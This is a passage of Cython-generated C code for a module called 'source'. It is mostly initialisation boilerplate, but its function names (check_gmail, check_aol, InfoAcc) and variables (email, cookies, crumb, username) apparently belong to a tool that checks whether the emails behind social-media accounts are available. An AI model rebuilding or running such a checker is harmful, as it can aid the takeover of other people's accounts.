  __pyx_codeobj__110 = (PyObject*)__Pyx_PyCode_New(0, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__109, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_Getaol, 332, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__110)) __PYX_ERR(0, 332, __pyx_L1_error)

  
  __pyx_tuple__111 = PyTuple_Pack(12, __pyx_n_s_email, __pyx_n_s_o, __pyx_n_s_tl, __pyx_n_s_host, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_ok, __pyx_n_s_username, __pyx_n_s_gg); if (unlikely(!__pyx_tuple__111)) __PYX_ERR(0, 377, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__111);
  __Pyx_GIVEREF(__pyx_tuple__111);
  __pyx_codeobj__112 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__111, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check_gmail, 377, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__112)) __PYX_ERR(0, 377, __pyx_L1_error)

  
  __pyx_tuple__113 = PyTuple_Pack(17, __pyx_n_s_email, __pyx_n_s_name, __pyx_n_s_f, __pyx_n_s_line, __pyx_n_s_specData, __pyx_n_s_specId, __pyx_n_s_crumb, __pyx_n_s_sessionIndex, __pyx_n_s_acrumb, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_data, __pyx_n_s_res, __pyx_n_s_ok, __pyx_n_s_username, __pyx_n_s_gg); if (unlikely(!__pyx_tuple__113)) __PYX_ERR(0, 433, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__113);
  __Pyx_GIVEREF(__pyx_tuple__113);
  __pyx_codeobj__114 = (PyObject*)__Pyx_PyCode_New(1, 0, 17, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__113, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check_aol, 433, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__114)) __PYX_ERR(0, 433, __pyx_L1_error)

  
  __pyx_tuple__115 = PyTuple_Pack(8, __pyx_n_s_email, __pyx_n_s_ua, __pyx_n_s_dev, __pyx_n_s_device_id, __pyx_n_s_uui, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response); if (unlikely(!__pyx_tuple__115)) __PYX_ERR(0, 505, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__115);
  __Pyx_GIVEREF(__pyx_tuple__115);
  __pyx_codeobj__116 = (PyObject*)__Pyx_PyCode_New(1, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__115, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check, 505, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__116)) __PYX_ERR(0, 505, __pyx_L1_error)

  
  __pyx_tuple__117 = PyTuple_Pack(5, __pyx_n_s_user, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_r); if (unlikely(!__pyx_tuple__117)) __PYX_ERR(0, 542, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__117);
  __Pyx_GIVEREF(__pyx_tuple__117);
  __pyx_codeobj__118 = (PyObject*)__Pyx_PyCode_New(1, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__117, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_rest, 542, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__118)) __PYX_ERR(0, 542, __pyx_L1_error)

  
  __pyx_tuple__119 = PyTuple_Pack(4, __pyx_n_s_hy, __pyx_n_s_ranges, __pyx_n_s_upper, __pyx_n_s_year); if (unlikely(!__pyx_tuple__119)) __PYX_ERR(0, 580, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__119);
  __Pyx_GIVEREF(__pyx_tuple__119);
  __pyx_codeobj__120 = (PyObject*)__Pyx_PyCode_New(1, 0, 4, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__119, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_date, 580, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__120)) __PYX_ERR(0, 580, __pyx_L1_error)

  
  __pyx_tuple__121 = PyTuple_Pack(16, __pyx_n_s_username, __pyx_n_s_gg, __pyx_n_s_rr, __pyx_n_s_Id, __pyx_n_s_full_name, __pyx_n_s_fows, __pyx_n_s_fowg, __pyx_n_s_pp, __pyx_n_s_isPraise, __pyx_n_s_bio, __pyx_n_s_is_verified, __pyx_n_s_bizz, __pyx_n_s_meta, __pyx_n_s_ss, __pyx_n_s_ff, __pyx_n_s_e); if (unlikely(!__pyx_tuple__121)) __PYX_ERR(0, 609, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__121);
  __Pyx_GIVEREF(__pyx_tuple__121);
  __pyx_codeobj__122 = (PyObject*)__Pyx_PyCode_New(2, 0, 16, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__121, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_InfoAcc, 609, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__122)) __PYX_ERR(0, 609, __pyx_L1_error)

  
  __pyx_tuple__123 = PyTuple_Pack(5, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_username, __pyx_n_s_emails, __pyx_n_s_email); if (unlikely(!__pyx_tuple__123)) __PYX_ERR(0, 661, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__123);
  __Pyx_GIVEREF(__pyx_tuple__123);
  __pyx_codeobj__124 = (PyObject*)__Pyx_PyCode_New(0, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__123, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_gg, 661, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__124)) __PYX_ERR(0, 661, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_float_0_1 = PyFloat_FromDouble(0.1); if (unlikely(!__pyx_float_0_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_6 = PyInt_FromLong(6); if (unlikely(!__pyx_int_6)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_9 = PyInt_FromLong(9); if (unlikely(!__pyx_int_9)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_10 = PyInt_FromLong(10); if (unlikely(!__pyx_int_10)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_15 = PyInt_FromLong(15); if (unlikely(!__pyx_int_15)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_16 = PyInt_FromLong(16); if (unlikely(!__pyx_int_16)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_200 = PyInt_FromLong(200); if (unlikely(!__pyx_int_200)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_300 = PyInt_FromLong(300); if (unlikely(!__pyx_int_300)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2010 = PyInt_FromLong(2010); if (unlikely(!__pyx_int_2010)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2011 = PyInt_FromLong(2011); if (unlikely(!__pyx_int_2011)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2012 = PyInt_FromLong(2012); if (unlikely(!__pyx_int_2012)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2013 = PyInt_FromLong(2013); if (unlikely(!__pyx_int_2013)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2014 = PyInt_FromLong(2014); if (unlikely(!__pyx_int_2014)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2015 = PyInt_FromLong(2015); if (unlikely(!__pyx_int_2015)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2016 = PyInt_FromLong(2016); if (unlikely(!__pyx_int_2016)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2017 = PyInt_FromLong(2017); if (unlikely(!__pyx_int_2017)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2018 = PyInt_FromLong(2018); if (unlikely(!__pyx_int_2018)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2019 = PyInt_FromLong(2019); if (unlikely(!__pyx_int_2019)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2020 = PyInt_FromLong(2020); if (unlikely(!__pyx_int_2020)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2021 = PyInt_FromLong(2021); if (unlikely(!__pyx_int_2021)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2022 = PyInt_FromLong(2022); if (unlikely(!__pyx_int_2022)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2023 = PyInt_FromLong(2023); if (unlikely(!__pyx_int_2023)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_10000 = PyInt_FromLong(10000L); if (unlikely(!__pyx_int_10000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_1279000 = PyInt_FromLong(1279000L); if (unlikely(!__pyx_int_1279000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_17699999 = PyInt_FromLong(17699999L); if (unlikely(!__pyx_int_17699999)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_17750000 = PyInt_FromLong(17750000L); if (unlikely(!__pyx_int_17750000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_263014407 = PyInt_FromLong(263014407L); if (unlikely(!__pyx_int_263014407)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_279760000 = PyInt_FromLong(279760000L); if (unlikely(!__pyx_int_279760000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_900990000 = PyInt_FromLong(900990000L); if (unlikely(!__pyx_int_900990000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_1629010000 = PyInt_FromLong(1629010000L); if (unlikely(!__pyx_int_1629010000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_2500000000 = PyInt_FromString((char *)"2500000000", 0, 0); if (unlikely(!__pyx_int_2500000000)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_3713668786 = PyInt_FromString((char *)"3713668786", 0, 0); if (unlikely(!__pyx_int_3713668786)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_5699785217 = PyInt_FromString((char *)"5699785217", 0, 0); if (unlikely(!__pyx_int_5699785217)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_8597939245 = PyInt_FromString((char *)"8597939245", 0, 0); if (unlikely(!__pyx_int_8597939245)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_21254029834 = PyInt_FromString((char *)"21254029834", 0, 0); if (unlikely(!__pyx_int_21254029834)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_43464475395 = PyInt_FromString((char *)"43464475395", 0, 0); if (unlikely(!__pyx_int_43464475395)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_50289297647 = PyInt_FromString((char *)"50289297647", 0, 0); if (unlikely(!__pyx_int_50289297647)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_57464707082 = PyInt_FromString((char *)"57464707082", 0, 0); if (unlikely(!__pyx_int_57464707082)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_int_63313426938 = PyInt_FromString((char *)"63313426938", 0, 0); if (unlikely(!__pyx_int_63313426938)) __PYX_ERR(0, 6, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 281, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct__genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct__genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct__genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct__genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct__genexpr = &__pyx_type_6source___pyx_scope_struct__genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 282, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_1_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_1_genexpr = &__pyx_type_6source___pyx_scope_struct_1_genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 283, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_2_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_2_genexpr = &__pyx_type_6source___pyx_scope_struct_2_genexpr;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  Py_ssize_t __pyx_t_14;
  Py_UCS4 __pyx_t_15;
  int __pyx_t_16;
  long __pyx_t_17;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 6, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 6, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 6, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 6, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 6, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 6, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 6, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 6, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_choice);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_string, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_string, __pyx_t_2) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
